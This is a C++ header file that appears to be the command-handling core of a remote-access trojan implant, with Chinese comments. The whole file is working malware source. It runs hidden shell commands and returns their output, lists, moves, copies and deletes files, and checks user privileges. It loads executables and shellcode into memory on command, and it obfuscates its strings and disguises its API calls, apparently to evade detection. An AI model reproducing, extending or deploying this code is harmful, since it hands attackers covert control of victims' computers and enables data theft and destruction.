#pragma once

stringObj sid;
stringObj internalIP;
stringObj user;
char* process = NULL;
stringObj pid;
stringObj connectTime;

int updateSessionInfo = 1;
mapObj<stringObj> sessionInfo;
mapObj<mapObj<stringObj>> outputInfo; // {sessionInfo, commandId: info, ...}
mapObj<mapObj<stringObj>> asyncOutputInfo; // {commandId: info, ...}
mapObj<mapObj<stringObj>> commandInfo; // {commandId: info, ...}
mapObj<mapObj<pointer>> hashInfo; // {hash: {funcName: pFunc, ...}, ...} 已加载的 ExeLite 的 Hash 与导出函数信息
int sleepBase = OBFINT(2000, "sleepBaseSIG");
int closeRAT = 0;

void CommandOutput(stringObj& id, stringObj& username, stringObj content, char* note) {
    mapObj<stringObj> info = outputInfo.Get(id);
    stringObj origContent = info.Get(OBFSTR("content", "OBFSIG"));
    info.Set(OBFSTR("username", "OBFSIG"), username);
    info.Set(OBFSTR("content", "OBFSIG"), origContent + content);
    info.Set(OBFSTR("note", "OBFSIG"), note);
    outputInfo.Set(id, info);
}

extern "C" void AsyncCommandOutput(char* id, char* username, char* content, char* note) {
    SPOOF(EnterCriticalSection, 1, &cs); // 多线程保护
    mapObj<stringObj> info = asyncOutputInfo.Get(id);
    stringObj origContent = info.Get(OBFSTR("content", "OBFSIG"));
    info.Set(OBFSTR("username", "OBFSIG"), username);
    info.Set(OBFSTR("content", "OBFSIG"), origContent + content);
    info.Set(OBFSTR("note", "OBFSIG"), note);
    asyncOutputInfo.Set(id, info);
    SPOOF(LeaveCriticalSection, 1, &cs);
}

void ls(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    size_t len;
    wchar_t* path = StrToWStr(paras, &len);
    if (path == NULL) {
        return;
    }
    wchar_t buf[MAX_PATH];
    if (!SPOOF(GetFullPathNameW, 4, path, MAX_PATH, buf, NULL)) {
        goto End;
    }
    char* fileInfoList = WStrToStr(buf, &len);
    if (fileInfoList == NULL) {
        goto End;
    }
    WIN32_FIND_DATAW findData;
    HANDLE hFind = SPOOF(FindFirstFileW, 2, path, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (*findData.cFileName != L'.') {
                FILETIME localFileTime;
                if (!SPOOF(FileTimeToLocalFileTime, 2, &findData.ftLastWriteTime, &localFileTime)) {
                    break;
                }
                SYSTEMTIME systemTime;
                if (!SPOOF(FileTimeToSystemTime, 2, &localFileTime, &systemTime)) {
                    break;
                }
                size_t len = StrLen(fileInfoList);
                char* reFileInfoList = (char*)SafeReAlloc(fileInfoList, len + MAX_PATH + 100);
                if (reFileInfoList == NULL) {
                    break;
                }
                fileInfoList = reFileInfoList;
                char* unit = OBFSTR("B", "OBFSIG");
                double fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
                if (fileSize > 1024) {
                    unit = OBFSTR("KB", "OBFSIG");
                    fileSize /= 1024.0;
                    if (fileSize > 1024) {
                        unit = OBFSTR("MB", "OBFSIG");
                        fileSize /= 1024.0;
                        if (fileSize > 1024) {
                            unit = OBFSTR("GB", "OBFSIG");
                            fileSize /= 1024.0;
                        }
                    }
                }
                int integerPart = fileSize;
                size_t _len;
                char* fileName = WStrToStr(findData.cFileName, &_len);
                if (fileName == NULL) {
                    break;
                }
                char* format = OBFSTR("\n%s - %04d.%02d.%02d %02d:%02d:%02d - %s - %d.%d %s", "OBFSIG");
                char* fileType = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? OBFSTR("Folder", "OBFSIG") : OBFSTR("File     ", "OBFSIG");
                SPOOF(wsprintfA, 13, fileInfoList + len, format, fileType, systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond, fileName, integerPart, (int)((fileSize - integerPart) * 10), unit);
                SafeFree(fileName);
            }
        } while (SPOOF(FindNextFileW, 2, hFind, &findData));
        SPOOF(FindClose, 1, hFind);
        CommandOutput(id, username, fileInfoList, NULL);
    }
    else {
        CommandOutput(id, username, stringObj(OBFSTR("[-] Invalid path or insufficient permissions: ", "OBFSIG")) + fileInfoList, NULL);
    }
    SafeFree(fileInfoList);
End:
    SafeFree(path);
}

void pwd(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    size_t len;
    wchar_t* path = StrToWStr(paras, &len);
    if (path == NULL) {
        return;
    }
    wchar_t buf[MAX_PATH];
    if (!SPOOF(GetFullPathNameW, 4, path, MAX_PATH, buf, NULL)) {
        goto End;
    }
    char* absolutePath = WStrToStr(buf, &len);
    if (absolutePath == NULL) {
        goto End;
    }
    DWORD attributes = SPOOF(GetFileAttributesW, 1, path);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        CommandOutput(id, username, stringObj(OBFSTR("[-] Invalid path or insufficient permissions: ", "OBFSIG")) + absolutePath, NULL);
    }
    else {
        if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
            CommandOutput(id, username, stringObj(OBFSTR("[+] Existing directory: ", "OBFSIG")) + absolutePath, NULL);
        }
        else {
            CommandOutput(id, username, stringObj(OBFSTR("[-] Exists but not a directory: ", "OBFSIG")) + absolutePath, NULL);
        }
    }
    SafeFree(absolutePath);
End:
    SafeFree(path);
}

void cut(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    char* src = paras;
    char* dest = paras + StrLen(paras) + 1;
    size_t len;
    wchar_t* srcPath = StrToWStr(src, &len);
    if (srcPath == NULL) {
        return;
    }
    wchar_t* destPath = StrToWStr(dest, &len);
    if (destPath == NULL) {
        SafeFree(srcPath);
        return;
    }
    if (SPOOF(MoveFileW, 2, srcPath, destPath)) {
        CommandOutput(id, username, stringObj(OBFSTR("[+] cut: ", "OBFSIG")) + src + OBFSTR(" ", "OBFSIG") + dest, NULL);
    }
    else {
        CommandOutput(id, username, stringObj(OBFSTR("[-] cut: ", "OBFSIG")) + src + OBFSTR(" ", "OBFSIG") + dest, NULL);
    }
    SafeFree(srcPath);
    SafeFree(destPath);
}

void MyCopy(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    char* src = paras;
    char* dest = paras + StrLen(paras) + 1;
    size_t len;
    wchar_t* srcPath = StrToWStr(src, &len);
    if (srcPath == NULL) {
        return;
    }
    wchar_t* destPath = StrToWStr(dest, &len);
    if (destPath == NULL) {
        SafeFree(srcPath);
        return;
    }
    if (SPOOF(CopyFileW, 3, srcPath, destPath, TRUE)) {
        CommandOutput(id, username, stringObj(OBFSTR("[+] copy: ", "OBFSIG")) + src + OBFSTR(" ", "OBFSIG") + dest, NULL);
    }
    else {
        CommandOutput(id, username, stringObj(OBFSTR("[-] copy: ", "OBFSIG")) + src + OBFSTR(" ", "OBFSIG") + dest, NULL);
    }
    SafeFree(srcPath);
    SafeFree(destPath);
}

void del(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    size_t len;
    wchar_t* path = StrToWStr(paras, &len);
    if (path == NULL) {
        return;
    }
    if (SPOOF(DeleteFileW, 1, path)) {
        CommandOutput(id, username, stringObj(OBFSTR("[+] del: ", "OBFSIG")) + paras, NULL);
    }
    else {
        CommandOutput(id, username, stringObj(OBFSTR("[-] del: ", "OBFSIG")) + paras, NULL);
    }
    SafeFree(path);
}

void mkdir(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    size_t len;
    wchar_t* path = StrToWStr(paras, &len);
    if (path == NULL) {
        return;
    }
    if (SPOOF(CreateDirectoryW, 2, path, NULL)) {
        CommandOutput(id, username, stringObj(OBFSTR("[+] mkdir: ", "OBFSIG")) + paras, NULL);
    }
    else {
        CommandOutput(id, username, stringObj(OBFSTR("[-] mkdir: ", "OBFSIG")) + paras, NULL);
    }
    SafeFree(path);
}

void cmd(stringObj& id, stringObj& username, char* paras) {
    if (paras == NULL) {
        return;
    }
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!SPOOF(CreatePipe, 4, &hRead, &hWrite, &sa, 0)) {
        return;
    }

    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi;
    si.cb = sizeof(STARTUPINFOW);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    size_t len;
    wchar_t* command = StrToWStr(paras, &len);
    if (command == NULL) {
        SPOOF(CloseHandle, 1, hRead);
        SPOOF(CloseHandle, 1, hWrite);
        return;
    }
    if (!SPOOF(CreateProcessW, 10, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        SafeFree(command);
        SPOOF(CloseHandle, 1, hRead);
        SPOOF(CloseHandle, 1, hWrite);
        return;
    }
    SPOOF(CloseHandle, 1, hWrite);
    SPOOF(CloseHandle, 1, pi.hThread);
    SPOOF(CloseHandle, 1, pi.hProcess);

    char* output = (char*)SafeAlloc(0);
    if (output == NULL) {
        goto End;
    }
    size_t outputLen = 0;
    DWORD currentReadLen = 0;
    do {
        char* reOutput = (char*)SafeReAlloc(output, outputLen + 100);
        if (reOutput == NULL) {
            break;
        }
        output = reOutput;
        if (!SPOOF(ReadFile, 5, hRead, output + outputLen, 100, &currentReadLen, NULL)) {
            break;
        }
        outputLen += currentReadLen;
    } while (currentReadLen);
    DWORD _len;
    char* ciphertext = Base64Encode(output, outputLen, &_len); // cmd 输出存在特殊字符无法使用 json
    if (ciphertext == NULL) {
        goto End;
    }
    CommandOutput(id, username, ciphertext, OBFSTR("cmd", "OBFSIG"));
    SafeFree(ciphertext);
End:
    SafeFree(output);
    SafeFree(command);
    SPOOF(CloseHandle, 1, hRead);
}

void getuser(stringObj& id, stringObj& username, char* paras) {
    DWORD size = 50;
    wchar_t buf[50] = { '*' };
    if (!SPOOF(GetUserNameW, 2, buf + 1, &size)) {
        return;
    }
    HANDLE hToken = NULL;
    DWORD dwSize = 0;
    TOKEN_ELEVATION tokenEle;
    DWORD isAdmin = 0;
    if (SPOOF(OpenProcessToken, 3, (HANDLE)-1, TOKEN_QUERY, &hToken)) {
        if (SPOOF(GetTokenInformation, 5, hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwSize)) {
            isAdmin = tokenEle.TokenIsElevated;
        }
        SPOOF(CloseHandle, 1, hToken);
    }
    size_t len;
    char* _user = NULL;
    if (isAdmin) {
        _user = WStrToStr(buf, &len);
    }
    else {
        _user = WStrToStr(buf + 1, &len);
    }
    if (_user == NULL) {
        return;
    }
    user = _user;
    SafeFree(_user);
    CommandOutput(id, username, stringObj(OBFSTR("[+] USERNAME: ", "OBFSIG")) + user, NULL);
    updateSessionInfo = 1;
}

void getpid(stringObj& id, stringObj& username, char* paras) {
    char buf[20];
    char* format = OBFSTR("%d", "OBFSIG");
    DWORD _pid = SPOOF(GetCurrentProcessId, 0);
    SPOOF(wsprintfA, 3, buf, format, _pid);
    pid = buf;
    CommandOutput(id, username, stringObj(OBFSTR("[+] PID: ", "OBFSIG")) + buf, NULL);
    updateSessionInfo = 1;
}

void RefLoader(PBYTE pBin, stringObj& hash);

void ExeLiteLoader(stringObj& id, stringObj& username, stringObj& func, stringObj& paras, stringObj& bin, stringObj& hash, stringObj& async) {
    // 构造参数
    DWORD parasSize = 0;
    char* _paras = NULL;
    size_t argc = 2;
    if (paras.length) {
        _paras = (char*)Base64Decode(paras.str, paras.length, &parasSize);
        if (_paras == NULL) {
            return;
        }
        for (size_t i = 0; i < parasSize; i++) {
            if (_paras[i] == '\0') {
                argc++;
            }
        }
    }
    char* _id = NULL;
    char* _username = NULL;
    char** argv = (char**)SafeAlloc(argc * sizeof(char*));
    if (argv == NULL) {
        goto End;
    }
    _id = (char*)SafeAlloc(id.length + 1);
    if (_id == NULL) {
        goto End;
    }
    memcpy(_id, id.str, id.length + 1);
    _username = (char*)SafeAlloc(username.length + 1);
    if (_username == NULL) {
        goto End;
    }
    memcpy(_username, username.str, username.length + 1);
    argv[0] = _id;
    argv[1] = _username;
    if (_paras != NULL) {
        int i = 0;
        for (int index = 2; i < parasSize; index++) {
            argv[index] = _paras + i;
            i += StrLen(argv[index]) + 1;
        }
    }

    // 获取 EXE 函数
    int load = 1;
getFunc:
    PVOID pFunc = NULL;
    pointer funcPointer = hashInfo.Get(hash).Get(func);
    if (funcPointer.p != NULL) {
        pFunc = funcPointer.p;
    }
    else if (load) {
        if (!bin.length) {
            goto End;
        }
        DWORD size;
        PBYTE pBin = Base64Decode(bin.str, bin.length, &size);
        if (pBin == NULL) {
            goto End;
        }
        RefLoader(pBin, hash);
        SafeFree(pBin);
        load = 0;
        goto getFunc;
    }

    // 调用 EXE 函数
    if (pFunc != NULL) {
        if (IsEqual(async.str, OBFSTR("false", "OBFSIG"))) {
            if (IsEqual(func.str, OBFSTR("entry", "OBFSIG"))) { // 如果加载的 EXE 使用了 C/C++ 等库, 则需要调用 entry 初始化
                ((int(*)(...))pFunc)();
            }
            else {
                ((void(*)(...))pFunc)(argv);
            }
        }
        else {
            if (IsEqual(func.str, OBFSTR("entry", "OBFSIG"))) {
                SPOOF(CreateThread, 6, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, NULL, 0, NULL);
            }
            else {
                if (SPOOF(CreateThread, 6, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, argv, 0, NULL) == NULL) {
                    goto End;
                }
                return;
            }
        }
    }
End:
    SafeFree(_id);
    SafeFree(_username);
    SafeFree(_paras);
    SafeFree(argv);
}

void ShellCodeLoader(stringObj& id, stringObj& username, stringObj& bin, stringObj& async) {
    DWORD size;
    PBYTE pBin = Base64Decode(bin.str, bin.length, &size);
    if (pBin == NULL) {
        return;
    }
    PBYTE pShell = (PBYTE)SPOOF(VirtualAlloc, 4, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (pShell == NULL) {
        goto End;
    }
    memcpy(pShell, pBin, size);
    DWORD oldProtect;
    if (!SPOOF(VirtualProtect, 4, pShell, size, PAGE_EXECUTE_READ, &oldProtect)) {
        goto End;
    }
    if (IsEqual(async.str, OBFSTR("false", "OBFSIG"))) {
        ((void(*)(...))pShell)();
        SPOOF(VirtualFree, 3, pShell, 0, MEM_RELEASE);
    }
    else {
        SPOOF(CreateThread, 6, NULL, 0, (LPTHREAD_START_ROUTINE)pShell, NULL, 0, NULL);
    }
End:
    SafeFree(pBin);
}

void ParseCommandData(char* data, size_t dataLen) {
    XorData(data, data, dataLen);
    MultiMapFromJson(data, commandInfo);
}

void RunCommands() {
    for (size_t i = 0; i < commandInfo.index; i++) {
        struct Pairs {
            stringObj id;
            mapObj<stringObj> info;
        };
        Pairs* pPairs = (Pairs*)&commandInfo.pairsList[i];
        stringObj id = pPairs->id;
        stringObj username = pPairs->info.Get(OBFSTR("username", "OBFSIG"));
        stringObj type = pPairs->info.Get(OBFSTR("type", "OBFSIG"));
        stringObj func = pPairs->info.Get(OBFSTR("func", "OBFSIG"));
        stringObj paras = pPairs->info.Get(OBFSTR("paras", "OBFSIG"));
        stringObj _sid = pPairs->info.Get(OBFSTR("sid", "OBFSIG"));
        if (_sid != sid && _sid.str != NULL) {
            sid = _sid;
            updateSessionInfo = 1;
        }
        if (id.str == NULL || username.str == NULL || type.str == NULL) {
            continue;
        }
        if (IsEqual(type.str, OBFSTR("native", "OBFSIG")) && func.length) {
            if (IsEqual(func.str, OBFSTR("ls", "OBFSIG"))) {
                ls(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("pwd", "OBFSIG"))) {
                pwd(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("cut", "OBFSIG"))) {
                DWORD size;
                char* plaintext = (char*)Base64Decode(paras.str, paras.length, &size);
                if (plaintext != NULL) {
                    cut(id, username, plaintext);
                    SafeFree(plaintext);
                }
            }
            else if (IsEqual(func.str, OBFSTR("copy", "OBFSIG"))) {
                DWORD size;
                char* plaintext = (char*)Base64Decode(paras.str, paras.length, &size);
                if (plaintext != NULL) {
                    MyCopy(id, username, plaintext);
                    SafeFree(plaintext);
                }
            }
            else if (IsEqual(func.str, OBFSTR("del", "OBFSIG"))) {
                del(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("mkdir", "OBFSIG"))) {
                mkdir(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("cmd", "OBFSIG"))) {
                cmd(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("getuser", "OBFSIG"))) {
                getuser(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("getpid", "OBFSIG"))) {
                getpid(id, username, paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("sleep", "OBFSIG"))) {
                sleepBase = StrToInt(paras.str);
            }
            else if (IsEqual(func.str, OBFSTR("exit", "OBFSIG"))) {
                closeRAT = 1;
            }
        }
        else if (IsEqual(type.str, OBFSTR("exeLite", "OBFSIG")) && func.length) {
            stringObj bin = pPairs->info.Get(OBFSTR("bin", "OBFSIG"));
            stringObj hash = pPairs->info.Get(OBFSTR("hash", "OBFSIG"));
            stringObj async = pPairs->info.Get(OBFSTR("async", "OBFSIG"));
            if (hash.length && async.length) {
                ExeLiteLoader(id, username, func, paras, bin, hash, async);
            }
        }
        else if (IsEqual(type.str, OBFSTR("shellcode", "OBFSIG")) && paras.length) {
            stringObj bin = pPairs->info.Get(OBFSTR("bin", "OBFSIG"));
            if (bin.length) {
                ShellCodeLoader(id, username, bin, paras);
            }
        }
    }
    commandInfo.DestroyHeap();
}